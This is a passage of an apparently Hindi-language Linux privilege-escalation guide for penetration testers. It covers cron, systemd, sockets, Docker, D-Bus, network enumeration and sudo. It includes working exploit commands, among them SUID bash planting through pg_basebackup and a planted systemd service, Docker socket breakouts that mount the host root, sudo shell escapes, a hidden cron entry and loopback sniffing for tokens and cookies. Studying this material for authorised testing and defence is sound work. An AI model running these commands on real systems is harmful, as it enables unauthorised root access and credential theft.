जो replacement सफल हुआ, उस पर leaked private signing material का इस्तेमाल करके ELF signer से हस्ताक्षर किए गए थे। इसका [format documentation](https://github.com/NUAA-WatchDog/linux-elf-binary-signer) executable के `.text` से निकले signature section का वर्णन करता है। सिर्फ `.text_sig` में certificate या उससे मेल खाने वाली string जोड़ना, अनदेखे verifier को संतुष्ट करने के लिए पर्याप्त है—यह नहीं दिखाया गया है। यह निष्कर्ष निकालने से पहले कि writable signed binary का दुरुपयोग किया जा सकता है, वास्तविक scheduled path, प्रभावी write access, root invocation और verifier policy की जाँच करें। केवल `.text_sig` section होना, जाँच के लिए एक संकेत भर है।

### अक्सर चलने वाली cron jobs

हर 1, 2 या 5 मिनट में चलने वाली processes खोजने के लिए आप उन्हें monitor कर सकते हैं। शायद आप इसका लाभ उठाकर privileges escalate कर सकें।

उदाहरण के लिए, **1 मिनट तक हर 0.1s पर monitor करने**, **सबसे कम बार execute हुए commands को ऊपर sort करने** और सबसे ज़्यादा बार execute हुए commands को हटाने के लिए, आप यह कर सकते हैं:

```bash
for i in $(seq 1 610); do ps -e --format cmd >> /tmp/monprocs.tmp; sleep 0.1; done; sort /tmp/monprocs.tmp | uniq -c | grep -v "\[" | sed '/^.\{200\}./d' | sort | grep -E -v "\s*[6-9][0-9][0-9]|\s*[0-9][0-9][0-9][0-9]"; rm /tmp/monprocs.tmp;
```

**आप [**pspy**](https://github.com/DominicBreuker/pspy/releases) का भी उपयोग कर सकते हैं** (यह शुरू होने वाली हर process को monitor करके सूचीबद्ध करेगा)।

### ऐसे root backups जो attacker द्वारा सेट किए गए mode bits को सुरक्षित रखते हैं (pg_basebackup)

अगर root-owned cron किसी ऐसे database directory पर `pg_basebackup` (या कोई recursive copy) चलाता है, जिसमें आप लिख सकते हैं, तो आप एक **SUID/SGID binary** रख सकते हैं, जिसे backup output में उन्हीं mode bits के साथ **root:root** के स्वामित्व में दोबारा copy किया जाएगा।<sup>[[26]](#references)</sup>

आम तौर पर खोजने का तरीका (कम विशेषाधिकार वाले DB user के रूप में):
- `pspy` का उपयोग करके ऐसा root cron खोजें, जो हर मिनट `/usr/lib/postgresql/14/bin/pg_basebackup -h /var/run/postgresql -U postgres -D /opt/backups/current/` जैसा command चलाता हो।
- पुष्टि करें कि source cluster (जैसे, `/var/lib/postgresql/14/main`) में आप लिख सकते हैं और job के बाद destination (`/opt/backups/current`) का स्वामित्व root के पास चला जाता है।

Exploit:

```bash
# As the DB service user owning the cluster directory
cd /var/lib/postgresql/14/main
cp /bin/bash .
chmod 6777 bash

# Wait for the next root backup run (pg_basebackup preserves permissions)
ls -l /opt/backups/current/bash  # expect -rwsrwsrwx 1 root root ... bash
/opt/backups/current/bash -p    # root shell without dropping privileges
```

यह इसलिए काम करता है क्योंकि `pg_basebackup` cluster की कॉपी बनाते समय file mode bits को सुरक्षित रखता है; root द्वारा चलाए जाने पर destination files को **root ownership + attacker-chosen SUID/SGID** मिलते हैं। इसी तरह की कोई भी privileged backup/copy routine, जो permissions को सुरक्षित रखती है और किसी executable location में लिखती है, vulnerable है।

### अदृश्य cron jobs

एक cronjob बनाना संभव है **जिसमें comment के बाद carriage return हो** (बिना newline character के), और cron job काम करेगी। उदाहरण (carriage return char पर ध्यान दें):

```bash
#This is a comment inside a cron config file\r* * * * * echo "Surprise!"
```

इस तरह की stealth entry का पता लगाने के लिए, ऐसे tools से cron files की जांच करें जो control characters दिखाते हैं:

```bash
cat -A /etc/crontab
cat -A /etc/cron.d/*
sed -n 'l' /etc/crontab /etc/cron.d/* 2>/dev/null
xxd /etc/crontab | head
```

## सेवाएँ

### लिखने योग्य _.service_ फ़ाइलें

जाँचें कि क्या आप किसी `.service` फ़ाइल में लिख सकते हैं। अगर हाँ, तो आप उसे **बदल सकते हैं**, ताकि service **शुरू**, **रीस्टार्ट** या **बंद** होने पर आपका **backdoor execute हो** (हो सकता है आपको मशीन रीबूट होने तक इंतज़ार करना पड़े)।\
उदाहरण के लिए, .service फ़ाइल के अंदर अपना backdoor इस तरह बनाएँ: **`ExecStart=/tmp/script.sh`**

### लिखने योग्य service binaries

ध्यान रखें कि अगर आपके पास services द्वारा execute की जा रही binaries पर **write permissions** हैं, तो आप उन्हें backdoors से बदल सकते हैं, ताकि services के दोबारा execute होने पर backdoors execute हों।

### systemd PATH - Relative Paths

आप **systemd** द्वारा उपयोग किए जाने वाले PATH को यहाँ देख सकते हैं:

```bash
systemctl show-environment
```

यदि आपको पता चलता है कि आप path के किसी भी folder में **लिख** सकते हैं, तो शायद आप **privileges बढ़ा** सकें। आपको service configuration files में इस्तेमाल हो रहे **relative paths** खोजने होंगे, जैसे:

```bash
ExecStart=faraday-server
ExecStart=/bin/sh -ec 'ifup --allow=hotplug %I; ifquery --state %I'
ExecStop=/bin/sh "uptux-vuln-bin3 -stuff -hello"
```

फिर, जिस systemd PATH फ़ोल्डर में आप लिख सकते हैं, उसमें relative path binary के समान नाम वाला एक **executable** बनाएँ। जब service से vulnerable action (**Start**, **Stop**, **Reload**) execute करने को कहा जाएगा, तो आपका **backdoor execute हो जाएगा** (आमतौर पर unprivileged users services को start/stop नहीं कर सकते, लेकिन जाँचें कि क्या आप `sudo -l` का उपयोग कर सकते हैं)।

**services के बारे में `man systemd.service` से और जानें।**

## **Timers**

**Timers** systemd unit files हैं जिनके नाम का अंत `**.timer**` से होता है। ये `**.service**` files या events को नियंत्रित करते हैं। **Timers** को cron के विकल्प के रूप में इस्तेमाल किया जा सकता है, क्योंकि इनमें calendar time events और monotonic time events के लिए अंतर्निहित समर्थन होता है और इन्हें asynchronously चलाया जा सकता है।

आप सभी timers की सूची इस तरह देख सकते हैं:

```bash
systemctl list-timers --all
```

### लिखने योग्य timers

यदि आप किसी timer को संशोधित कर सकते हैं, तो आप उससे systemd.unit की कुछ इकाइयाँ (जैसे `.service` या `.target`) निष्पादित करवा सकते हैं।

```bash
Unit=backdoor.service
```

डॉक्यूमेंटेशन में आप पढ़ सकते हैं कि Unit क्या है:

> इस timer के समाप्त होने पर सक्रिय किया जाने वाला unit। आर्ग्युमेंट एक unit name है, जिसका suffix ".timer" नहीं होता। यदि निर्दिष्ट न किया जाए, तो यह मान डिफ़ॉल्ट रूप से उस service पर सेट होता है जिसका नाम timer unit के नाम जैसा हो, suffix को छोड़कर। (ऊपर देखें।) यह अनुशंसित है कि सक्रिय किए जाने वाले unit का नाम और timer unit का नाम suffix को छोड़कर एक जैसा हो।

इसलिए, इस permission का दुरुपयोग करने के लिए आपको:

- कोई systemd unit (जैसे `.service`) ढूँढना होगा जो **एक writable binary चला रहा हो**
- कोई systemd unit ढूँढना होगा जो **relative path चला रहा हो**, और आपके पास **systemd PATH** पर **writable privileges** हों (ताकि आप उस executable का रूप धारण कर सकें)

**`man systemd.timer` के साथ timers के बारे में और जानें।**

### **Timer सक्षम करना**

Timer सक्षम करने के लिए आपको root privileges चाहिए और यह चलाना होगा:

```bash
sudo systemctl enable backu2.timer
Created symlink /etc/systemd/system/multi-user.target.wants/backu2.timer → /lib/systemd/system/backu2.timer.
```

ध्यान दें कि **timer** को `/etc/systemd/system/<WantedBy_section>.wants/<name>.timer` पर symlink बनाकर **activate** किया जाता है।

## Sockets

Unix Domain Sockets (UDS), client-server models में एक ही या अलग-अलग machines पर **process communication** की सुविधा देते हैं। ये computers के बीच communication के लिए standard Unix descriptor files का उपयोग करते हैं और `.socket` files के ज़रिए सेट अप किए जाते हैं।<sup>[[14]](#references)</sup>

Sockets को `.socket` files के ज़रिए configure किया जा सकता है।

**Sockets के बारे में `man systemd.socket` से और जानें।** इस file में कई दिलचस्प parameters configure किए जा सकते हैं:

- `ListenStream`, `ListenDatagram`, `ListenSequentialPacket`, `ListenFIFO`, `ListenSpecial`, `ListenNetlink`, `ListenMessageQueue`, `ListenUSBFunction`: ये अलग-अलग options हैं, लेकिन इनका सार यह **बताता है कि socket कहाँ listen करेगा** (AF_UNIX socket file का path, सुनने के लिए IPv4/6 और/या port number, आदि)।
- `Accept`: एक boolean argument लेता है। अगर **true** हो, तो हर incoming connection के लिए एक **service instance शुरू किया जाता है**, और उसे केवल connection socket दिया जाता है। अगर **false** हो, तो सभी listening sockets स्वयं **शुरू की गई service unit को दिए जाते हैं**, और सभी connections के लिए केवल एक service unit शुरू होती है। Datagram sockets और FIFOs के लिए यह value अनदेखी की जाती है, जहाँ एक ही service unit बिना शर्त सभी incoming traffic संभालती है। **डिफ़ॉल्ट false है**। Performance के कारण, नई daemons केवल ऐसे तरीके से लिखने की सलाह दी जाती है जो `Accept=no` के अनुकूल हो।
- `ExecStartPre`, `ExecStartPost`: एक या अधिक command lines लेते हैं, जो listening **sockets**/FIFOs के **बनाए और bind किए जाने से पहले** या **बाद में** चलाए जाते हैं। Command line का पहला token एक absolute filename होना चाहिए, जिसके बाद process के arguments आते हैं।
- `ExecStopPre`, `ExecStopPost`: अतिरिक्त **commands**, जो listening **sockets**/FIFOs के **बंद और हटाए जाने से पहले** या **बाद में** चलाए जाते हैं।
- `Service`: incoming traffic पर **activate** की जाने वाली **service** unit का नाम बताता है। यह setting केवल `Accept=no` वाले sockets के लिए अनुमत है। डिफ़ॉल्ट रूप से यह socket के समान नाम वाली service होती है (केवल suffix बदला हुआ होता है)। ज़्यादातर मामलों में, इस option का उपयोग करना आवश्यक नहीं होना चाहिए।

### Writable .socket files

अगर आपको कोई **writable** `.socket` file मिले, तो आप `[Socket]` section की शुरुआत में कुछ ऐसा **जोड़** सकते हैं: `ExecStartPre=/home/kali/sys/backdoor` और socket बनने से पहले backdoor execute होगा। इसलिए, आपको **शायद machine के reboot होने तक इंतज़ार करना होगा।**\
_ध्यान दें कि system को उस socket file configuration का उपयोग करना चाहिए, वरना backdoor execute नहीं होगा_

### Socket activation + writable unit path (गुम service बनाना)

एक और गंभीर misconfiguration यह है:

- `Accept=no` और `Service=<name>.service` वाली socket unit
- संदर्भित service unit मौजूद नहीं है
- attacker `/etc/systemd/system` (या किसी अन्य unit search path) में लिख सकता है

ऐसी स्थिति में, attacker `<name>.service` बना सकता है, फिर socket पर traffic भेज सकता है ताकि systemd नई service को root के रूप में load और execute करे।

संक्षिप्त तरीका:

```bash
systemctl cat vuln.socket
# [Socket]
# Accept=no
# Service=vuln.service
```

```bash
cat >/etc/systemd/system/vuln.service <<'EOF'
[Service]
Type=oneshot
ExecStart=/bin/bash -c 'cp /bin/bash /var/tmp/rootbash && chmod 4755 /var/tmp/rootbash'
EOF
nc -q0 127.0.0.1 9999
/var/tmp/rootbash -p
```

### लिखने योग्य sockets

यदि आप **किसी भी लिखने योग्य socket की पहचान करते हैं** (_अब हम Unix Sockets की बात कर रहे हैं, config `.socket` files की नहीं_), तो **आप उस socket के साथ communicate कर सकते हैं** और शायद किसी vulnerability का exploit कर सकते हैं।

### Unix Sockets की गणना करें

```bash
netstat -a -p --unix
```

### कच्चा कनेक्शन

```bash
#apt-get install netcat-openbsd
nc -U /tmp/socket  #Connect to UNIX-domain stream socket
nc -uU /tmp/socket #Connect to UNIX-domain datagram socket

#apt-get install socat
socat - UNIX-CLIENT:/dev/socket #connect to UNIX-domain socket, irrespective of its type
```

**Exploitation example:**


{{#ref}}
../../network-information/socket-command-injection.md
{{#endref}}

### HTTP sockets

ध्यान दें कि कुछ **HTTP requests के लिए listening sockets** हो सकते हैं (_मेरा मतलब .socket फ़ाइलों से नहीं, बल्कि unix sockets के रूप में काम करने वाली फ़ाइलों से है_)। आप इसे इस तरह जाँच सकते हैं:

```bash
curl --max-time 2 --unix-socket /path/to/socket/file http://localhost/
```

यदि socket किसी **HTTP** request का जवाब देता है, तो आप उससे **communicate** कर सकते हैं और शायद **किसी vulnerability का exploit** कर सकते हैं।

### Writable Docker Socket

Docker socket, जो अक्सर `/var/run/docker.sock` पर मिलता है, एक महत्वपूर्ण file है जिसे सुरक्षित रखा जाना चाहिए। डिफ़ॉल्ट रूप से, इस पर `root` user और `docker` group के सदस्यों को write access होता है। इस socket पर write access मिलने से privilege escalation हो सकता है। इसे करने का तरीका और Docker CLI उपलब्ध न होने पर वैकल्पिक तरीके नीचे दिए गए हैं।

#### **Docker CLI से Privilege Escalation**

यदि आपके पास Docker socket पर write access है, तो आप इन commands का उपयोग करके privilege escalation कर सकते हैं:<sup>[[15]](#references)</sup>

```bash
docker -H unix:///var/run/docker.sock run -v /:/host -it ubuntu chroot /host /bin/bash
docker -H unix:///var/run/docker.sock run -it --privileged --pid=host debian nsenter -t 1 -m -u -n -i sh
```

ये commands आपको host के file system तक root-level access वाला container चलाने देती हैं।

#### **Docker API का सीधे उपयोग**

ऐसे मामलों में जहाँ Docker CLI उपलब्ध नहीं है, Unix socket पर raw HTTP का उपयोग करके Docker socket का फिर भी दुरुपयोग किया जा सकता है। सबसे भरोसेमंद तरीका है:

- host root को bind-mounted करके एक लंबे समय तक चलने वाला helper container बनाएँ
- उसे start करें
- उस helper के अंदर एक `exec` instance बनाएँ
- `exec` instance को start करें और API के ज़रिए output वापस पढ़ें

**Docker images की सूची बनाएँ**

```bash
curl --unix-socket /var/run/docker.sock http://localhost/images/json
```

**एक सहायक कंटेनर बनाएँ और शुरू करें**

```bash
HELPER=helper

curl --unix-socket /var/run/docker.sock \
  -H "Content-Type: application/json" \
  -d '{"Image":"alpine:3.20","Cmd":["sleep","99999"],"HostConfig":{"Binds":["/:/host"]}}' \
  "http://localhost/v1.47/containers/create?name=${HELPER}"

curl --unix-socket /var/run/docker.sock \
  -X POST "http://localhost/v1.47/containers/${HELPER}/start"
```

**एक exec instance बनाएं**

```bash
EXEC_ID=$(
  curl -s --unix-socket /var/run/docker.sock \
    -H "Content-Type: application/json" \
    -d '{"AttachStdout":true,"AttachStderr":true,"Tty":true,"Cmd":["sh","-lc","find /host/root -maxdepth 1 -type f"]}' \
    "http://localhost/v1.47/containers/${HELPER}/exec" \
  | tr -d '\n' \
  | sed -n 's/.*"Id":"\([^"]*\)".*/\1/p'
)
```

**exec instance शुरू करें और output पढ़ें**

```bash
curl --unix-socket /var/run/docker.sock \
  -H "Content-Type: application/json" \
  -d '{"Detach":false,"Tty":true}' \
  "http://localhost/v1.47/exec/${EXEC_ID}/start"
```

यह पैटर्न आमतौर पर `socat` या `nc -U` से `attach` को मैन्युअल रूप से चलाने की कोशिश करने से ज़्यादा भरोसेमंद होता है। `/:/host` के साथ helper बना सकने के बाद, आप `/host/root/...` जैसी फ़ाइलें पढ़ने, `/host/root/.ssh` में SSH keys जोड़ने या host की startup files में बदलाव करने के लिए अतिरिक्त `exec` instances का उपयोग कर सकते हैं।

### अन्य

ध्यान दें कि यदि आपके पास **`docker` group के अंदर होने के कारण** docker socket पर write permissions हैं, तो आपके पास [**privileges बढ़ाने के और भी तरीके**](../../user-information/interesting-groups-linux-pe/index.html#docker-group) हैं। यदि [**docker API किसी port पर listen कर रहा है**, तो आप उसे compromise भी कर सकते हैं](../../../network-services-pentesting/2375-pentesting-docker.md#compromising)।

**Containers से बाहर निकलने या privileges बढ़ाने के लिए container runtimes का दुरुपयोग करने के और तरीके** यहाँ देखें:


{{#ref}}
../../containers-namespaces/container-security/
{{#endref}}

## Containerd (ctr) के ज़रिए privilege escalation

यदि आपको पता चलता है कि आप **`ctr`** command का उपयोग कर सकते हैं, तो अगला पेज पढ़ें, क्योंकि **आप privileges बढ़ाने के लिए इसका दुरुपयोग कर सकते हैं**:


{{#ref}}
../../containers-namespaces/containerd-ctr-privilege-escalation.md
{{#endref}}

## **RunC** के ज़रिए privilege escalation

यदि आपको पता चलता है कि आप **`runc`** command का उपयोग कर सकते हैं, तो अगला पेज पढ़ें, क्योंकि **आप privileges बढ़ाने के लिए इसका दुरुपयोग कर सकते हैं**:


{{#ref}}
../../containers-namespaces/runc-privilege-escalation.md
{{#endref}}

## **D-Bus**

D-Bus एक परिष्कृत **inter-Process Communication (IPC) system** है, जो applications को कुशलता से आपस में संवाद करने और data साझा करने की सुविधा देता है। आधुनिक Linux system को ध्यान में रखकर बनाया गया यह system, applications के बीच संचार के विभिन्न तरीकों के लिए एक मज़बूत framework प्रदान करता है।<sup>[[16]](#references)</sup>

यह system बहुउपयोगी है और इसमें बुनियादी IPC शामिल है, जो processes के बीच data exchange को बेहतर बनाता है—कुछ हद तक **enhanced UNIX domain sockets** की तरह। इसके अलावा, यह events या signals broadcast करने में मदद करता है, जिससे system components के बीच सहज एकीकरण संभव होता है। उदाहरण के लिए, incoming call के बारे में Bluetooth daemon से मिला signal music player को mute कर सकता है, जिससे उपयोगकर्ता का अनुभव बेहतर होता है। D-Bus एक remote object system भी उपलब्ध कराता है, जो applications के बीच service requests और method invocations को सरल बनाता है और उन processes को आसान करता है जो पहले जटिल हुआ करते थे।

D-Bus **allow/deny model** पर काम करता है। यह मिलते-जुलते policy rules के संयुक्त प्रभाव के आधार पर message permissions (method calls, signal emissions आदि) का प्रबंधन करता है। ये policies bus के साथ interactions तय करती हैं और इन permissions का दुरुपयोग करके privilege escalation संभव हो सकता है।

ऐसी policy का एक उदाहरण `/etc/dbus-1/system.d/wpa_supplicant.conf` में दिया गया है। इसमें root user को `fi.w1.wpa_supplicant1` का मालिक बनने, उसे messages भेजने और उससे messages प्राप्त करने की permissions दी गई हैं।

जिस policy में user या group निर्दिष्ट न हो, वह सभी पर लागू होती है। वहीं, "default" context policies उन सभी पर लागू होती हैं जिन्हें अन्य विशिष्ट policies में शामिल नहीं किया गया है।

```xml
<policy user="root">
    <allow own="fi.w1.wpa_supplicant1"/>
    <allow send_destination="fi.w1.wpa_supplicant1"/>
    <allow send_interface="fi.w1.wpa_supplicant1"/>
    <allow receive_sender="fi.w1.wpa_supplicant1" receive_type="signal"/>
</policy>
```

**यहाँ D-Bus communication को enumerate और exploit करना सीखें:**


{{#ref}}
../../processes-crontab-systemd-dbus/d-bus-enumeration-and-command-injection-privilege-escalation.md
{{#endref}}

## **नेटवर्क**

नेटवर्क को enumerate करना और मशीन की स्थिति का पता लगाना हमेशा दिलचस्प होता है।

### सामान्य enumeration

```bash
#Hostname, hosts and DNS
cat /etc/hostname /etc/hosts /etc/resolv.conf
dnsdomainname

#NSS resolution order (hosts file vs DNS)
grep -E '^(hosts|networks):' /etc/nsswitch.conf
getent hosts localhost

#Content of /etc/inetd.conf & /etc/xinetd.conf
cat /etc/inetd.conf /etc/xinetd.conf

#Interfaces
cat /etc/networks
(ifconfig || ip a)
(ip -br addr || ip addr show)

#Routes and policy routing (pivot paths)
ip route
ip -6 route
ip rule
ip route get 1.1.1.1

#L2 neighbours
(arp -e || arp -a || ip neigh)

#Neighbours
(arp -e || arp -a)
(route || ip n)

#L2 topology (VLANs/bridges/bonds)
ip -d link
bridge link 2>/dev/null

#Network namespaces (hidden interfaces/routes in containers)
ip netns list 2>/dev/null
ls /var/run/netns/ 2>/dev/null
nsenter --net=/proc/1/ns/net ip a 2>/dev/null

#Iptables rules
(timeout 1 iptables -L 2>/dev/null; cat /etc/iptables/* | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null)

#nftables and firewall wrappers (modern hosts)
sudo nft list ruleset 2>/dev/null
sudo nft list ruleset -a 2>/dev/null
sudo ufw status verbose 2>/dev/null
sudo firewall-cmd --state 2>/dev/null
sudo firewall-cmd --list-all 2>/dev/null

#Forwarding / asymmetric routing / conntrack state
sysctl net.ipv4.ip_forward net.ipv6.conf.all.forwarding net.ipv4.conf.all.rp_filter 2>/dev/null
sudo conntrack -L 2>/dev/null | head -n 20

#Files used by network services
lsof -i
```

यदि कोई सक्रिय `/etc/inetd.conf` entry GNU Inetutils `telnetd` को root के रूप में चलाती है, तो configured binary version और local listener की जाँच करें, भले ही port केवल loopback पर bound हो। GNU Inetutils 1.9.3 से 2.7 तक में [telnet authentication bypass](https://seclists.org/oss-sec/2026/q1/89) था, जिसमें client द्वारा दिया गया `USER`, `login -f` तक पहुँचता था (CVE-2026-24061)। कोई process या version string केवल एक संकेत है; इसे exposed मानने से पहले vendor patch status और वास्तविक daemon की पुष्टि करें। [Telnet guide](../../../network-services-pentesting/pentesting-telnet.md) में अधिक जानकारी है।

### Outbound filtering की त्वरित जाँच

यदि host commands चला सकता है, लेकिन callbacks विफल होते हैं, तो DNS, transport, proxy और route filtering की तुरंत अलग-अलग जाँच करें:

```bash
# DNS over UDP and TCP (TCP fallback often survives UDP/53 filters)
dig +time=2 +tries=1 @1.1.1.1 google.com A
dig +tcp +time=2 +tries=1 @1.1.1.1 google.com A

# Common outbound ports
for p in 22 25 53 80 443 587 8080 8443; do nc -vz -w3 example.org "$p"; done

# Route/path clue for 443 filtering
sudo traceroute -T -p 443 example.org 2>/dev/null || true

# Proxy-enforced environments and remote-DNS SOCKS testing
env | grep -iE '^(http|https|ftp|all)_proxy|no_proxy'
curl --socks5-hostname <ip>:1080 https://ifconfig.me
```

### खुले पोर्ट

मशीन तक पहुँचने से पहले, उस पर चल रही उन नेटवर्क सेवाओं की हमेशा जाँच करें जिनसे आप पहले इंटरैक्ट नहीं कर पाए थे:

```bash
(netstat -punta || ss --ntpu)
(netstat -punta || ss --ntpu) | grep "127.0"
ss -tulpn
#Quick view of local bind addresses (great for hidden/isolated interfaces)
ss -tulpn | awk '{print $5}' | sort -u
```

bind target के आधार पर listeners को वर्गीकृत करें:

- `0.0.0.0` / `[::]`: सभी स्थानीय interfaces पर exposed।
- `127.0.0.1` / `::1`: केवल स्थानीय (tunnel/forward के लिए अच्छे candidates)।
- विशिष्ट internal IPs (जैसे `10.x`, `172.16/12`, `192.168.x`, `fe80::`): आमतौर पर केवल internal segments से reachable।

### केवल-स्थानीय service की triage workflow

जब आप किसी host को compromise करते हैं, तो `127.0.0.1` से bind की गई services अक्सर पहली बार आपके shell से reachable हो जाती हैं। एक त्वरित स्थानीय workflow यह है:

```bash
# 1) Find local listeners
ss -tulnp

# 2) Discover open localhost TCP ports
nmap -Pn --open -p- 127.0.0.1

# 3) Fingerprint only discovered ports
nmap -Pn -sV -p <ports> 127.0.0.1

# 4) Manually interact / banner grab
nc 127.0.0.1 <port>
printf 'HELP\r\n' | nc 127.0.0.1 <port>
```

### नेटवर्क स्कैनर के रूप में LinPEAS (केवल नेटवर्क मोड)

स्थानीय PE जाँचों के अलावा, linPEAS एक लक्षित नेटवर्क स्कैनर के रूप में चल सकता है। यह `$PATH` में उपलब्ध बाइनरी का उपयोग करता है (आमतौर पर `fping`, `ping`, `nc`, `ncat`) और कोई टूल इंस्टॉल नहीं करता।

```bash
# Auto-discover subnets + hosts + quick ports
./linpeas.sh -t

# Host discovery in CIDR
./linpeas.sh -d 10.10.10.0/24

# Host discovery + custom ports
./linpeas.sh -d 10.10.10.0/24 -p 22,80,443

# Scan one IP (default/common ports)
./linpeas.sh -i 10.10.10.20

# Scan one IP with selected ports
./linpeas.sh -i 10.10.10.20 -p 21,22,80,443
```

यदि आप `-t` के बिना `-d`, `-p`, या `-i` पास करते हैं, तो linPEAS एक शुद्ध network scanner की तरह काम करता है (बाकी privilege-escalation checks छोड़कर)।

### Sniffing

जाँचें कि क्या आप traffic sniff कर सकते हैं। अगर कर सकते हैं, तो आप कुछ credentials हासिल कर सकते हैं।

```
timeout 1 tcpdump
```

त्वरित व्यावहारिक जांच:

```bash
#Can I capture without full sudo?
which dumpcap && getcap "$(which dumpcap)"

#Find capture interfaces
tcpdump -D
ip -br addr
```

Loopback (`lo`) post-exploitation में खास तौर पर उपयोगी है, क्योंकि कई केवल आंतरिक सेवाएँ वहाँ tokens/cookies/credentials उजागर करती हैं:

```bash
sudo tcpdump -i lo -s 0 -A -n 'tcp port 80 or 8000 or 8080' \
  | egrep -i 'authorization:|cookie:|set-cookie:|x-api-key|bearer|token|csrf'
```

अभी कैप्चर करें, बाद में पार्स करें:

```bash
sudo tcpdump -i any -s 0 -n -w /tmp/capture.pcap
tshark -r /tmp/capture.pcap -Y http.request \
  -T fields -e frame.time -e ip.src -e http.host -e http.request.uri
```

## उपयोगकर्ता

### सामान्य Enumeration

जाँचें कि आप **कौन** हैं, आपके पास कौन-से **विशेषाधिकार** हैं, सिस्टम में कौन-से **उपयोगकर्ता** मौजूद हैं, कौन **login** कर सकता है और किनके पास **root privileges** हैं:

```bash
#Info about me
id || (whoami && groups) 2>/dev/null
#List all users
cat /etc/passwd | cut -d: -f1
#List users with console
cat /etc/passwd | grep "sh$"
#List superusers
awk -F: '($3 == "0") {print}' /etc/passwd
#Currently logged users
who
w
#Only usernames
users
#Login history
last | tail
#Last log of each user
lastlog2 2>/dev/null || lastlog

#List all users and their groups
for i in $(cut -d":" -f1 /etc/passwd 2>/dev/null);do id $i;done 2>/dev/null | sort
#Current user PGP keys
gpg --list-keys 2>/dev/null
```

### बड़ा UID

Linux के कुछ versions एक ऐसे bug से प्रभावित थे, जो **UID > INT_MAX** वाले users को privileges escalate करने देता है। अधिक जानकारी: [यहाँ](https://gitlab.freedesktop.org/polkit/polkit/issues/74), [यहाँ](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2018-19788.sh) और [यहाँ](https://twitter.com/paragonsec/status/1071152249529884674)।<sup>[[33]](#references)[[34]](#references)[[35]](#references)</sup>\
इसे **`systemd-run -t /bin/bash`** का उपयोग करके **exploit** करें।

### Groups

जाँचें कि क्या आप किसी ऐसे **group के member** हैं, जो आपको root privileges दे सकता है:


{{#ref}}
../../user-information/interesting-groups-linux-pe/
{{#endref}}

### Clipboard

जाँचें कि क्या clipboard के अंदर कुछ दिलचस्प मौजूद है (यदि संभव हो)।

```bash
if [ `which xclip 2>/dev/null` ]; then
    echo "Clipboard: "`xclip -o -selection clipboard 2>/dev/null`
    echo "Highlighted text: "`xclip -o 2>/dev/null`
  elif [ `which xsel 2>/dev/null` ]; then
    echo "Clipboard: "`xsel -ob 2>/dev/null`
    echo "Highlighted text: "`xsel -o 2>/dev/null`
  else echo "Not found xsel and xclip"
  fi
```

### पासवर्ड नीति

```bash
grep "^PASS_MAX_DAYS\|^PASS_MIN_DAYS\|^PASS_WARN_AGE\|^ENCRYPT_METHOD" /etc/login.defs
```

### ज्ञात पासवर्ड

अगर आपको environment का **कोई भी password पता है**, तो उस password का उपयोग करके **हर user के रूप में login करने की कोशिश करें**।

### Su Brute

अगर आपको बहुत शोर करने से कोई आपत्ति नहीं है और कंप्यूटर पर `su` और `timeout` binaries मौजूद हैं, तो [su-bruteforce](https://github.com/carlospolop/su-bruteforce) का उपयोग करके user को brute-force करने की कोशिश कर सकते हैं।\
[**Linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) `-a` parameter के साथ users को brute-force करने की कोशिश भी करता है।

## Writable PATH का दुरुपयोग

### $PATH

अगर आपको पता चलता है कि आप **$PATH के किसी folder में लिख सकते हैं**, तो writable folder के अंदर **backdoor बनाकर privileges escalate** कर सकते हैं। इसका नाम ऐसे command के नाम जैसा रखें जिसे कोई दूसरा user (आदर्श रूप से root) execute करने वाला हो और जो $PATH में आपके writable folder से पहले स्थित किसी folder से **लोड न हो**।

### SUDO और SUID

आपको sudo का उपयोग करके कोई command execute करने की अनुमति हो सकती है या उस पर suid bit सेट हो सकता है। इसे जाँचने के लिए:

```bash
sudo -l #Check commands you can execute with sudo
find / -perm -4000 2>/dev/null #Find all SUID binaries
```

कुछ **अप्रत्याशित कमांड आपको फ़ाइलें पढ़ने और/या लिखने या यहाँ तक कि कोई कमांड निष्पादित करने की अनुमति देते हैं**।<sup>[[8]](#references)</sup> उदाहरण के लिए:

```bash
sudo awk 'BEGIN {system("/bin/sh")}'
sudo find /etc -exec sh -i \;
sudo tcpdump -n -i lo -G1 -w /dev/null -z ./runme.sh
sudo tar c a.tar -I ./runme.sh a
ftp>!/bin/sh
less>! <shell_comand>
```

### NOPASSWD

Sudo configuration किसी उपयोगकर्ता को password जाने बिना किसी दूसरे उपयोगकर्ता के privileges के साथ कुछ command execute करने की अनुमति दे सकता है।

```
$ sudo -l
User demo may run the following commands on crashlab:
    (root) NOPASSWD: /usr/bin/vim
```

इस उदाहरण में `demo` उपयोगकर्ता `root` के रूप में `vim` चला सकता है। अब `root` डायरेक्टरी में SSH key जोड़कर या `sh` चलाकर shell प्राप्त करना आसान है।

```
sudo vim -c '!sh'
```

### sudo स्क्रिप्ट में unquoted Bash comparison

Bash में, `[[ "$protected" == $candidate ]]` का दायाँ पक्ष एक pattern होता है। अगर root-capable sudo स्क्रिप्ट `candidate` को caller द्वारा नियंत्रित फ़ाइल से भरती है, तो `prefix*` जैसी value protected string की शुरुआत से match कर सकती है। सफलता और त्रुटि के अलग-अलग paths तब prefix oracle उजागर कर सकते हैं। जब literal equality का इरादा हो, तो दाएँ पक्ष को quote करें (`[[ "$protected" == "$candidate" ]]`)। किसी unquoted comparison को exploitable मानने से पहले वास्तविक sudo arguments, input provenance और दिखाई देने वाले branch behavior की समीक्षा करें। [GNU Bash manual](https://www.gnu.org/software/bash/manual/html_node/Conditional-Constructs.html) इस pattern behavior को परिभाषित करता है।

### sudo के तहत PrusaSlicer project files

अगर caller sliced किए जाने वाले `.3mf` project को चुन सकता है, तो `prusaslicer` या `prusa-slicer` के लिए unrestricted root-capable sudo grant की समीक्षा करना उचित है। किसी project में post-processing script हो सकती है, जो G-code export होने पर चलती है; crafted projects PrusaSlicer 2.6.1 तक में commands चला सकते हैं ([CVE-2023-47268](https://security-tracker.debian.org/tracker/CVE-2023-47268))। Privilege boundary तक पहुँचना संभव है, यह निष्कर्ष निकालने से पहले प्रभावी sudo rule, binary version और vendor patches, project source और यह पुष्टि करें कि संबंधित export path चलता है या नहीं। एक fixed project argument या प्रभावी `NOEXEC` policy नतीजा बदल सकती है। केवल slicer का installed होना privilege escalation path स्थापित नहीं करता।

### SETENV

यह directive उपयोगकर्ता को कुछ execute करते समय **एक environment variable सेट करने** की अनुमति देता है:

```bash
